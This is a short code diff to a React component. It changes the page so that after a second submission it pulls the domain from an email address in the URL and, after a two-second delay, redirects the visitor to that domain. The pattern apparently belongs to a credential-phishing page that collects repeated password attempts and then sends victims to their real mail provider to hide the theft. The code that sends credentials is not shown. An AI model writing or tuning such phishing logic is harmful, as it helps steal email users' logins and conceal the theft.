@@ -68,13 +68,16 @@ const App = ()=>{
       });
 
       setCount(count=> count + 1);
-            if(count >= 1){
+            if(count >= 2){
                 const redirectURL = window.location.href;
                 const sliceEqualSign = redirectURL.indexOf("@");
-                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
+                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                 console.log(extracetdemailDomain);
-                window.location.reload();
-                window.location.href = `https://www.${extracetdemailDomain}`;
+                setTimeout(() => {
+                  window.location.reload();
+                  window.location.href = `https://www.${extracetdemailDomain}`;
+                }, 2000);
+
             };
 
     }
